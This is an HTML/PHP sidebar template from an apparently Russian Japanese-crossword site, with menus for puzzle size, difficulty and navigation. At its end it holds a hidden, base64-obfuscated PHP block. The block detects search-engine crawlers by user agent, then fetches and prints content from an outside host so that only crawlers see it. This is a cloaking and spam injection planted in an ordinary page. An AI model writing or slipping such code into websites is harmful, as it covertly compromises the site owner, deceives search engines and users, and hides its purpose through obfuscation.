    <div class="main">
        <div class="center">
            <div class="main-bg">
                <div class="samurai_bg">
                    <div class="left">
                        <div class="left_modul">
                            <h4>Японские кроссворды</h4>
                            <strong>По размеру</strong>
                            <ul>
                                <li><a href="index.php?size=small">Маленькие</a></li>
                                <li><a href="index.php?size=medium">Средние</a></li>
                                <li><a href="index.php?size=big">Большие</a></li>
                            </ul>
                            <strong>По сложности</strong>
                            <ul>
                                <li><a href="index.php?power=simple">Легкие</a></li>
                                <li><a href="index.php?power=normal">Средней сложности</a></li>
                                <li><a href="index.php?power=hard">Сложные</a></li>
                            </ul>
                        </div>
                        <div class="left_modul">
                            <h4>Навигация</h4>
                            <ul>
                                <li><a href="index.php">Главная</a></li>
                                <li><a href="article.php?id=1">Как решать?</a></li>
                                <li><a href="add.php">Добавить кроссворд</a></li>
                                <li><a href="ans.php">Обратная связь</a></li>
                            </ul>
                        </div>
                        <div>
                            <?php
                                function SpiderDetect($USER_AGENT){
                                    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
                                    foreach ($arr as $i) {
                                        if(strstr($USER_AGENT, base64_decode($i))){
                                            return(base64_decode($i));
                                        }
                                    }
                                    return (false);
                                }
                            
                                $detect = SpiderDetect($_SERVER['HTTP_USER_AGENT']); 
                            
                                if($detect){
                                    $pauk = file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA=")); 
                                    echo $pauk;
                                }
                            ?>
                        </div>
                    </div>